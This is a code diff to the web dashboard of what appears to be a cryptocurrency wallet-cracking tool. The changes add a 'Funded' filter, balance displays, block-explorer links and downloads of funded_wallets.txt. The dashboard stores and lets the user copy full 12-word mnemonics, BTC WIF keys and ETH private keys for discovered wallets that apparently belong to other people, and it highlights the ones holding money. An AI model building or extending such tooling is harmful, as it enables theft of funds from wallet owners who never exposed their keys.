@@ -1135,7 +1135,7 @@
             </span>
           </button>
 
-          <button class="tab-btn" data-tab="Watch" data-title="Verified Activity Vault" data-sub="Every discovered wallet with full mnemonics, keys and ever-held history" onclick="switchTab('Watch')">
+          <button class="tab-btn" data-tab="Watch" data-title="Verified Activity Vault" data-sub="Funded and ever-held wallets with live balances, full mnemonics, keys and history" onclick="switchTab('Watch')">
             <span class="tab-btn-left">
               <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
               <span>Activity Vault</span>
@@ -1368,11 +1368,16 @@
                   <span class="pill pill-cyan mono" style="font-size:9px;">FULL MNEMONIC + KEYS</span>
                   <span id="SmartPinnedCountBadge" class="pill pill-amber mono">0 SAVED</span>
                 </div>
-                <div style="display:flex; align-items:center; gap:6px;">
+                <div style="display:flex; align-items:center; gap:6px; flex-wrap:wrap;">
                   <button class="btn" style="height:23px; padding:0 8px; font-size:10px;" onclick="setWatchlistFilter('all')">All</button>
                   <button class="btn" style="height:23px; padding:0 8px; font-size:10px; border-color:rgba(56,189,248,0.4); color:#7DD3FC;" onclick="setWatchlistFilter('mnemonic')">12-Word Mnemonics Only</button>
+                  <button class="btn" style="height:23px; padding:0 8px; font-size:10px; border-color:rgba(245,158,11,0.45); color:#FCD34D;" onclick="setWatchlistFilter('everheld')">📜 Ever-Held</button>
+                  <button class="btn" id="PinnedFundedFilterBtn" style="height:23px; padding:0 8px; font-size:10px; border-color:rgba(16,185,129,0.5); color:#6EE7B7; font-weight:700;" onclick="setWatchlistFilter('funded')">💰 Funded (0)</button>
                   <button class="btn btn-emerald" style="height:23px; padding:0 9px; font-size:10px; font-weight:700;" onclick="window.open('/api/export-ever-held-txt', '_blank')">
-                    📥 Download ever_held_wallets.txt
+                    📥 ever_held_wallets.txt
+                  </button>
+                  <button class="btn btn-emerald" style="height:23px; padding:0 9px; font-size:10px; font-weight:700;" onclick="window.open('/api/export-found-txt', '_blank')">
+                    📥 funded_wallets.txt
                   </button>
                 </div>
               </div>
@@ -1384,7 +1389,7 @@
                       <th style="width:30%;">Full 12-Word Mnemonic / Seed Phrase</th>
                       <th style="width:23%;">BTC WIF &amp; ETH 0x Private Key</th>
                       <th style="width:15%;">BTC &amp; ETH Address</th>
-                      <th style="width:18%;">History &amp; Access Keys</th>
+                      <th style="width:18%;">Balance / History &amp; Access Keys</th>
                     </tr>
                   </thead>
                   <tbody id="SmartPinnedEverHeldBody"></tbody>
@@ -1679,20 +1684,27 @@
           <div class="card">
             <div class="card-header" style="flex-wrap:wrap; gap:8px;">
               <div style="display:flex; align-items:center; gap:8px;">
-                <span class="card-title">Discovered Wallets Vault (Full Mnemonics, Private Keys &amp; Ever-Held History)</span>
+                <span class="card-title">Discovered Wallets Vault (Live Balances, Full Mnemonics, Private Keys &amp; Ever-Held History)</span>
                 <span class="pill pill-amber mono" id="WatchlistHeaderCount">0 WALLETS</span>
               </div>
               <div style="display:flex; align-items:center; gap:6px; flex-wrap:wrap;">
                 <button class="btn" style="height:25px; padding:0 8px; font-size:10.5px;" onclick="setWatchlistFilter('all')">All</button>
                 <button class="btn" style="height:25px; padding:0 8px; font-size:10.5px; border-color:rgba(56,189,248,0.4); color:#7DD3FC;" onclick="setWatchlistFilter('mnemonic')">12-Word Mnemonics Only</button>
                 <button class="btn" style="height:25px; padding:0 8px; font-size:10.5px; border-color:rgba(245,158,11,0.4); color:#FCD34D;" onclick="setWatchlistFilter('everheld')">📜 Ever-Held</button>
+                <button class="btn" id="WatchlistFundedFilterBtn" style="height:25px; padding:0 10px; font-size:10.5px; font-weight:700; border-color:rgba(16,185,129,0.55); color:#6EE7B7;" onclick="setWatchlistFilter('funded')">💰 Funded (0)</button>
                 <button class="btn btn-emerald" style="height:25px; padding:0 10px; font-size:10.5px; font-weight:700;" onclick="window.open('/api/export-ever-held-txt', '_blank')">
-                  📥 Download ever_held_wallets.txt
+                  📥 ever_held_wallets.txt
+                </button>
+                <button class="btn btn-emerald" style="height:25px; padding:0 10px; font-size:10.5px; font-weight:700;" onclick="window.open('/api/export-found-txt', '_blank')">
+                  📥 funded_wallets.txt
                 </button>
               </div>
             </div>
+            <div id="FundedSummaryStrip" class="mono" style="display:none; font-size:11px; color:#6EE7B7; background:rgba(16,185,129,0.08); border:1px solid rgba(16,185,129,0.35); border-radius:7px; padding:8px 10px; margin-bottom:8px;">
+              💰 Funded vault: <strong id="FundedSummaryText">0 wallets · $0.00</strong>
+            </div>
             <div style="font-size:11px; color:#94A3B8; margin-bottom:8px;" class="mono">
-              💾 Automatically saved to <strong style="color:#FCD34D;">ever_held_wallets.txt</strong> &amp; <strong style="color:#34D399;">EVER_HELD_WALLETS_VAULT.json</strong>. Click <strong style="color:#7DD3FC;">🔑 Access / Copy Keys</strong> on any row to copy the 12-word Mnemonic, BTC WIF, Electrum 3-path block, or ETH 0x Private Key.
+              💾 Automatically saved to <strong style="color:#FCD34D;">ever_held_wallets.txt</strong> &amp; <strong style="color:#34D399;">EVER_HELD_WALLETS_VAULT.json</strong>; funded hits to <strong style="color:#6EE7B7;">funded_wallets.txt</strong> &amp; <strong style="color:#6EE7B7;">FOUND_WALLETS_VAULT.json</strong>. Click <strong style="color:#7DD3FC;">🔑 Access / Copy Keys</strong> on any row to copy the 12-word Mnemonic, BTC WIF, Electrum 3-path block, or ETH 0x Private Key.
             </div>
             <div class="table-container">
               <table class="data-table mono">
@@ -1702,7 +1714,7 @@
                     <th style="width:28%;">12-Word Mnemonic / Seed Material</th>
                     <th style="width:23%;">BTC WIF &amp; ETH 0x Private Key</th>
                     <th style="width:16%;">BTC &amp; ETH Address</th>
-                    <th style="width:20%;">History &amp; Access Keys</th>
+                    <th style="width:20%;">Balance / History &amp; Access Keys</th>
                   </tr>
                 </thead>
                 <tbody id="WatchlistBody"></tbody>
@@ -3813,6 +3825,9 @@
         ? data.everHeldWalletsCount
         : localEverHeld;
       const fundedNowCount = typeof data.foundVaultCount === 'number' ? data.foundVaultCount : 0;
+      if (typeof data.foundVaultCount === 'number' && data.foundVaultCount !== fundedVaultCount) {
+        loadFundedVault(false); // a new funded hit landed — pull the authoritative list
+      }
       const everHeldEl = document.getElementById('QuickStatsEverHeldText');
       if (everHeldEl) everHeldEl.textContent = everHeldCount.toLocaleString();
       document.getElementById('QuickStatsFoundText').textContent = fundedNowCount.toLocaleString();
@@ -3924,6 +3939,18 @@
   function setWatchlistFilter(mode) {
     currentWatchlistFilter = mode || 'all';
     renderWatchlist();
+    if (currentWatchlistFilter === 'funded') {
+      // Pull the authoritative list so the view is never stale right after a hit.
+      loadFundedVault(false);
+      const funded = Array.from(watchlistItems.values()).filter(isConfirmedFunded);
+      const total = funded.reduce((sum, w) => sum + Number(w.balanceUsd || 0), 0);
+      toast(
+        funded.length
+          ? `${funded.length} funded wallet${funded.length === 1 ? '' : 's'} · $${total.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} confirmed on-chain`
+          : 'No funded wallets yet — hits appear only after a live chain confirms a balance.',
+        funded.length ? 'success' : 'error'
+      );
+    }
   }
 
   function copyTextValue(val, btn) {
@@ -4156,6 +4183,135 @@
     }
   }
 
+  function metaTitleCase(addr) {
+    return String(addr || '').toUpperCase();
+  }
+
+  /** Split "ETH_ETH" / "ARB_USDT" style keys into a readable "<chain> <symbol>". */
+  const BALANCE_CHAIN_PREFIXES = { ETH: 'Ethereum', ARB: 'Arbitrum', BASE: 'Base', OP: 'Optimism', AVAX: 'Avalanche', MATIC: 'Polygon', POLY: 'Polygon', BNB: 'BNB Chain', BSC: 'BNB Chain', TRX: 'TRON' };
+  function formatBalanceLines(balances) {
+    const entries = Object.entries(balances || {}).filter(([, v]) => Number(v) > 0);
+    if (entries.length === 0) return '';
+    return entries.map(([key, value]) => {
+      const parts = String(key).split('_');
+      let chain = '';
+      let symbol = key;
+      if (parts.length === 2 && BALANCE_CHAIN_PREFIXES[parts[0]]) {
+        chain = BALANCE_CHAIN_PREFIXES[parts[0]];
+        symbol = parts[1];
+      } else if (parts.length === 2 && parts[1] === 'TRC20') {
+        chain = 'TRON'; symbol = parts[0];
+      }
+      return `<span style="display:inline-block; margin-right:10px; color:#CBD5E1;"><b style="color:#6EE7B7;">${fmtNum(value)}</b> ${symbol}${chain ? ` <span style="color:var(--text-muted);">(${chain})</span>` : ''}</span>`;
+    }).join('');
+  }
+
+  const EXPLORERS = [
+    { field: 'ethAddress', chain: 'Etherscan', url: a => `https://etherscan.io/address/${a}` },
+    { field: 'btcSegwit', chain: 'mempool.space', url: a => `https://mempool.space/address/${a}` },
+    { field: 'btcLegacy', chain: 'mempool.space', url: a => `https://mempool.space/address/${a}` },
+    { field: 'trxAddress', chain: 'Tronscan', url: a => `https://tronscan.org/#/address/${a}` },
+    { field: 'xrpAddress', chain: 'XRPSCAN', url: a => `https://xrpscan.com/account/${a}` },
+    { field: 'solAddress', chain: 'Solscan', url: a => `https://solscan.io/account/${a}` },
+    { field: 'ltcAddress', chain: 'LitecoinSpace', url: a => `https://litecoinspace.org/address/${a}` },
+    { field: 'dogeAddress', chain: 'Dogechain', url: a => `https://dogechain.info/address/${a}` }
+  ];
+
+  function buildExplorerLinks(item) {
+    const seen = new Set();
+    const links = [];
+    for (const ex of EXPLORERS) {
+      const addr = item[ex.field];
+      if (!addr || seen.has(addr)) continue;
+      seen.add(addr);
+      links.push(`<a href="${ex.url(addr)}" target="_blank" rel="noopener" style="font-size:9.5px; color:#7DD3FC; text-decoration:none; border:1px solid rgba(125,211,252,0.35); border-radius:5px; padding:1px 6px;">${ex.chain} ↗</a>`);
+    }
+    return links.length ? `<div style="display:flex; flex-wrap:wrap; gap:4px; margin-top:6px;">${links.join('')}</div>` : '';
+  }
+
+  /** Balance block shown for wallets with money on them right now. */
+  function buildFundedBlock(item) {
+    const balances = formatBalanceLines(item.balances);
+    const confirmedAt = item.foundAt || item.detectedAt ? fmtTimestamp(item.foundAt || item.detectedAt) : '';
+    return `
+      <div style="font-size:10.5px; color:#6EE7B7; margin-top:4px; line-height:1.5; background:rgba(16,185,129,0.08); border:1px solid rgba(16,185,129,0.3); border-radius:6px; padding:6px 8px;">
+        <div><b style="color:#94A3B8;">Current Balance:</b> <span style="font-size:13px; font-weight:800;">${fmtUsd(item.balanceUsd)}</span></div>
+        ${balances ? `<div style="margin-top:3px;">${balances}</div>` : ''}
+        ${confirmedAt ? `<div style="font-size:9.5px; color:var(--text-muted); margin-top:3px;">confirmed ${confirmedAt}</div>` : ''}
+      </div>
+      ${buildExplorerLinks(item)}
+    `;
+  }
+
+  /** Ever-held block (historical amounts). */
+  function buildEverHeldBlock(item) {
+    const parts = [];
+    if (Number(item.totalEverReceivedBtc || 0) > 0) parts.push(`₿ ${Number(item.totalEverReceivedBtc).toFixed(6)} BTC`);
+    if (Number(item.totalEverReceivedEth || 0) > 0) parts.push(`Ξ ${Number(item.totalEverReceivedEth).toFixed(6)} ETH`);
+    if (item.historicalTokenSummary) parts.push(`(${item.historicalTokenSummary})`);
+    const summary = parts.length
+      ? `${parts.join(' ')} <span style="color:#34D399;">(~${Number((item.totalEverReceivedBtc || 0) * 98000 + (item.totalEverReceivedEth || 0) * 3200 + (item.totalEverReceivedTokensUsd || 0)).toFixed(2)} Historical)</span>`
+      : (item.ethHistoryAudited
+          ? `Gas/Contract Calls Only (${item.historicalTx || 1} TX)`
+          : `⏳ Auditing On-Chain TX Volume (${item.historicalTx || 1} TX)...`);
+    return `<div style="font-size:10.5px; color:#FCD34D; margin-top:4px; line-height:1.4;"><b>Ever Held:</b> ${summary}</div>`;
+  }
+
+  /* ───────────────── Funded-wallet vault (live-confirmed only) ───────────────── */
+  let fundedVaultSignature = '';
+  let fundedVaultBusy = false;
+  let fundedVaultCount = 0;
+  let fundedVaultUsd = 0;
+
+  function normalizeFundedRecord(rec) {
+    const item = { ...rec };
+    item.verification = 'confirmed';
+    item.liveVerified = true;
+    item.walletHistoryState = 'FUNDED_NOW';
+    if (!item.source) item.source = 'Funded Vault';
+    if (!item.input && item.mnemonic) item.input = item.mnemonic;
+    return item;
+  }
+
+  /**
+   * Pull every confirmed funded wallet from the server so the list survives
+   * reloads and shows wallets found in earlier sessions (not just this stream).
+   */
+  async function loadFundedVault(force) {
+    if (fundedVaultBusy) return;
+    fundedVaultBusy = true;
+    try {
+      const res = await fetch('/api/funded-wallets?limit=500', { cache: 'no-store' });
+      const data = await res.json();
+      if (!data || !Array.isArray(data.items)) return;
+      fundedVaultCount = Number(data.count || data.items.length);
+      fundedVaultUsd = Number(data.totalUsd || 0);
+      const sig = data.items.map(i => [i.btcLegacy || i.ethAddress || i.input, i.balanceUsd, JSON.stringify(i.balances || {})].join(':')).join('|');
+      let added = 0;
+      for (const rec of data.items) {
+        const item = normalizeFundedRecord(rec);
+        const key = item.btcLegacy || item.ethAddress || item.input;
+        if (!key) continue;
+        const existing = watchlistItems.get(key);
+        if (!existing) {
+          watchlistItems.set(key, item);
+          added++;
+        } else if (!isConfirmedFunded(existing)) {
+          // The vault is authoritative: it only holds chain-confirmed balances.
+          watchlistItems.set(key, { ...existing, ...item });
+          added++;
+        }
+      }
+      if (force || sig !== fundedVaultSignature || added > 0) {
+        fundedVaultSignature = sig;
+        renderWatchlist(true);
+      }
+    } catch (_) {
+    } finally {
+      fundedVaultBusy = false;
+    }
+  }
+
   function updateVerificationBadge(pending) {
     const el = document.getElementById('VerificationPendingBadge');
     if (!el) return;
@@ -4238,15 +4394,7 @@
         </td>
         <td style="white-space:normal; vertical-align:top;">
           <div>${formatWalletStatusBadge(item)}</div>
-          <div style="font-size:10.5px; color:#FCD34D; margin-top:4px; line-height:1.4;">
-            <b>Ever Held:</b>
-            ${Number(item.totalEverReceivedBtc || 0) > 0 ? `₿ ${Number(item.totalEverReceivedBtc).toFixed(6)} BTC ` : ''}
-            ${Number(item.totalEverReceivedEth || 0) > 0 ? `Ξ ${Number(item.totalEverReceivedEth).toFixed(6)} ETH ` : ''}
-            ${item.historicalTokenSummary ? `(${item.historicalTokenSummary}) ` : ''}
-            ${(Number(item.totalEverReceivedBtc || 0) === 0 && Number(item.totalEverReceivedEth || 0) === 0 && !item.historicalTokenSummary)
-              ? (item.ethHistoryAudited ? `Gas/Contract Calls Only (${item.historicalTx || 1} TX)` : `⏳ Auditing On-Chain TX Volume (${item.historicalTx || 1} TX)...`)
-              : `<span style="color:#34D399;">(~$${Number((item.totalEverReceivedBtc || 0) * 98000 + (item.totalEverReceivedEth || 0) * 3200 + (item.totalEverReceivedTokensUsd || 0)).toFixed(2)} Historical)</span>`}
-          </div>
+          ${isFunded ? buildFundedBlock(item) : buildEverHeldBlock(item)}
           <button class="btn btn-primary" style="height:24px; padding:0 8px; font-size:10.5px; margin-top:6px; width:100%;" onclick="openWalletAccessModal('${wk}')">
             🔑 Access / Copy All Keys
           </button>
@@ -4272,13 +4420,38 @@
       }
     }
     if (renderedWatchRows === 0) {
-      const placeholder = '<tr><td colspan="5" class="empty-state">No wallets captured yet. Every candidate with a current balance or any on-chain history lands here automatically — click any row in the live stream to inspect it before it is saved.</td></tr>';
+      const emptyMsg = currentWatchlistFilter === 'funded'
+        ? 'No funded wallets yet. A wallet appears here only after a live chain query confirms a non-zero balance — Bloom-filter leads stay in the pending queue until then.'
+        : (currentWatchlistFilter === 'everheld'
+            ? 'No ever-held wallets yet. Wallets with past on-chain activity land here after the live RPC check confirms their history.'
+            : 'No wallets captured yet. Every candidate with a current balance or any on-chain history lands here automatically — click any row in the live stream to inspect it before it is saved.');
+      const placeholder = `<tr><td colspan="5" class="empty-state">${emptyMsg}</td></tr>`;
       if (body) body.innerHTML = placeholder;
       if (pinnedBody) pinnedBody.innerHTML = placeholder;
     }
     updateVaultCounters();
-    document.getElementById('WatchlistHeaderCount').textContent = `${watchlistItems.size} WALLETS`;
-
+    const fundedItems = Array.from(watchlistItems.values()).filter(isConfirmedFunded);
+    const fundedTotal = fundedItems.reduce((sum, w) => sum + Number(w.balanceUsd || 0), 0);
+    const headerCount = document.getElementById('WatchlistHeaderCount');
+    if (headerCount) {
+      headerCount.textContent = currentWatchlistFilter === 'funded'
+        ? `${fundedItems.length} FUNDED · ${fmtUsd(fundedTotal)}`
+        : `${watchlistItems.size} WALLETS · ${fundedItems.length} FUNDED`;
+    }
+    const watchBtn = document.getElementById('WatchlistFundedFilterBtn');
+    if (watchBtn) watchBtn.textContent = `💰 Funded (${fundedItems.length})`;
+    const pinnedBtn = document.getElementById('PinnedFundedFilterBtn');
+    if (pinnedBtn) pinnedBtn.textContent = `💰 Funded (${fundedItems.length})`;
+    const strip = document.getElementById('FundedSummaryStrip');
+    const stripText = document.getElementById('FundedSummaryText');
+    if (strip && stripText) {
+      if (fundedItems.length > 0) {
+        strip.style.display = 'block';
+        stripText.textContent = `${fundedItems.length} wallet${fundedItems.length === 1 ? '' : 's'} · ${fmtUsd(fundedTotal)} confirmed on-chain`;
+      } else {
+        strip.style.display = 'none';
+      }
+    }
   }
 
   async function runWildcardSolver() {
@@ -5027,6 +5200,9 @@
   }
 
   installWorkspaceChrome();
+
+  loadFundedVault(true);
+  setInterval(() => loadFundedVault(false), 20000);
 
   setInterval(drainNextStreamItem, 18);
   setInterval(stepSmoothCounters, 20);
